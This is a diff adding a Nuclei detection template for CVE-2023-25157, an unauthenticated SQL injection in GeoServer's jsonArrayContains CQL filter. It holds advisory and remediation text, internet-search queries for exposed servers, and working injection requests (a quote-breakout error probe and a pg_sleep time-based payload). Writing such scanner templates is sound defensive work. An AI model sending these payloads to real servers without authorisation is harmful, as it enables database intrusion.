@@ -1,0 +1,185 @@
+id: geoserver-jsonarraycontains-sqli
+
+info:
+  name: GeoServer jsonArrayContains CQL Filter - SQL Injection
+  author: portbuster1337,DhiyaneshDk
+  severity: critical
+  description: |
+    GeoServer is an open source software server written in Java that allows users to share and edit geospatial data. GeoTools FilterToSqlHelper.constructEquality writes the expected argument of the jsonArrayContains CQL function RAW into the SQL string while only escaping the JSON pointer. A single quote in the value parameter breaks out of the PostgreSQL jsonb_path_exists string literal, enabling unauthenticated SQL injection. When the PostGIS backend runs with superuser privileges, the injection escalates to operating system command execution through PostgreSQL COPY TO PROGRAM. Users are advised to upgrade to either version 2.21.4, or version 2.22.2 to resolve this issue. Users unable to upgrade should enable the PostGIS DataStore preparedStatements setting and disable encode functions as a workaround.
+  impact: |
+    Successful exploitation allows unauthenticated attackers to execute arbitrary SQL queries against the PostGIS database, potentially leading to full database exfiltration, data manipulation, or remote code execution on the database server via COPY TO PROGRAM.
+  remediation: |
+    Upgrade GeoServer to version 2.21.4 or 2.22.2 or later. As an interim workaround, enable the PostGIS DataStore preparedStatements setting to prevent stacked-query abuse and disable encode functions to limit CQL filter function misuse.
+  reference:
+    - https://gist.github.com/portbuster1337/70d75ec246b85e3199037ce212ff1a06
+    - https://github.com/geoserver/geoserver/security/advisories/GHSA-7g5f-wrx8-5ccf
+    - https://nvd.nist.gov/vuln/detail/CVE-2023-25157
+    - https://github.com/geoserver/geoserver/commit/145a8af798590288d270b240235e89c8f0b62e1d
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cve-id: CVE-2023-25157
+    cwe-id: CWE-89
+    epss-score: 0.85247
+    epss-percentile: 0.99697
+    cpe: cpe:2.3:a:osgeo:geoserver:*:*:*:*:*:*:*:*
+  metadata:
+    verified: "true"
+    max-request: 6
+    vendor: osgeo
+    product: geoserver
+    shodan-query:
+      - title:"geoserver"
+      - http.title:"geoserver"
+    fofa-query:
+      - title="geoserver"
+      - app="geoserver"
+    google-query: intitle:"geoserver"
+  tags: cve,cve2023,geoserver,sqli,jsonarraycontains,postgresql,osgeo,kev,vkev
+
+flow: |
+  set("ctx", "/geoserver");
+  http("detect");
+  if (!template["geoserver_detected"]) {
+    set("ctx", "");
+    http("detect");
+  }
+  if (template["geoserver_detected"]) {
+    http("capabilities");
+    for (var name of iterate(template["feature_names"])) {
+      set("name", name);
+      set("column", "");
+      http("get-column");
+      if (template["column"]) {
+        if (http("sqli-verify")) {
+          break;
+        }
+        if (http("sqli-time")) {
+          break;
+        }
+      }
+    }
+  }
+
+http:
+  - id: detect
+    raw:
+      - |
+        GET {{ctx}}/web/ HTTP/1.1
+        Host: {{Hostname}}
+
+    redirects: true
+    max-redirects: 3
+
+    matchers:
+      - type: word
+        words:
+          - "GeoServer"
+        internal: true
+
+    extractors:
+      - type: regex
+        name: geoserver_detected
+        regex:
+          - '(GeoServer)'
+        group: 1
+        internal: true
+        part: body
+
+  - id: capabilities
+    raw:
+      - |
+        GET {{ctx}}/ows?service=WFS&version=1.0.0&request=GetCapabilities HTTP/1.1
+        Host: {{Hostname}}
+
+
+    matchers:
+      - type: word
+        words:
+          - "FeatureType"
+        internal: true
+
+    extractors:
+      - type: regex
+        name: feature_names
+        regex:
+          - '(?s)<FeatureType[^>]*>\s*<Name>([^<]+)</Name>'
+        group: 1
+        internal: true
+        part: body
+
+  - id: get-column
+    raw:
+      - |
+        GET {{ctx}}/ows?service=WFS&version=1.0.0&request=GetFeature&typeName={{name}}&maxFeatures=1&outputFormat=csv HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        words:
+          - "FID"
+        internal: true
+
+    extractors:
+      - type: regex
+        name: column
+        regex:
+          - 'FID,([a-zA-Z_][a-zA-Z0-9_]*)'
+        group: 1
+        internal: true
+        part: body
+
+  - id: sqli-verify
+    raw:
+      - |
+        GET {{ctx}}/ows?service=WFS&version=1.0.0&request=GetFeature&typeName={{name}}&CQL_FILTER=jsonArrayContains(%22{{column}}%22,%27/a%27,%27x%27%27%27)%20=%20true HTTP/1.1
+        Host: {{Hostname}}
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "PSQLException"
+          - "SQL SELECT"
+          - "jsonb_path_exists"
+          - "syntax error"
+          - "unterminated quoted string"
+        condition: or
+
+      - type: word
+        part: header
+        words:
+          - "text/xml"
+
+    extractors:
+      - type: dsl
+        name: matched_feature
+        dsl:
+          - "name"
+      - type: kval
+        kval:
+          - content_type
+
+  - id: sqli-time
+    raw:
+      - |
+        @timeout: 30s
+        GET {{ctx}}/ows?service=WFS&version=1.0.0&request=GetFeature&typeName={{name}}&CQL_FILTER=jsonArrayContains(%22{{column}}%22,%27/a%27,%27x%22)%27%27)%20AND%20(SELECT%20pg_sleep(6))%20IS%20NOT%20NULL%20)--%27)%20=%20true HTTP/1.1
+        Host: {{Hostname}}
+
+    stop-at-first-match: true
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration>=6"
+
+    extractors:
+      - type: dsl
+        name: matched_feature
+        dsl:
+          - "name"
+# digest: 4a0a00473045022060ba7c5b79dc1e283b9886939af02631b0cb98984327da2b0cd9807b93e3bfea022100cc97ac39bb6d45d3f0c32ea831654a4f2679553efc25697d0dbbb36c410fc948:922c64590222798bb761d5b6d8e72950
